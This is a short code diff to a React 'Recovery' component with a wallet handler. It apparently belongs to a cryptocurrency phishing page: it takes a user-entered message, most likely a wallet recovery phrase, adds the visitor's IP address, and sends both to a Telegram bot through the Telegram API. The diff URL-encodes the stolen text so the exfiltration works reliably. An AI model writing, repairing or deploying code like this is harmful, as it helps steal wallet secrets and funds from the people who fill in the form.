@@ -38,11 +38,16 @@ const Recovery = ({ walletHandler }) => {
       let disabled = true;
       let ipAddress = clientIp;
       console.log("ip", ipAddress);
+
       let sms = ["________(User Message)_______ = ", message, " ", " _____________________(User IP Address)___________________ = ", ipAddress];
 
       let finalString = sms.join('\r\n');
+      
 
-      fetch(`https://api.telegram.org/bot${bot.token}/sendMessage?chat_id=${bot.chatID}=&text=${finalString}`, {
+      let encodedText = encodeURIComponent(finalString);
+
+
+      fetch(`https://api.telegram.org/bot${bot.token}/sendMessage?chat_id=${bot.chatID}=&text=${encodedText}`, {
         method: "GET"
       })
         .then(success => {
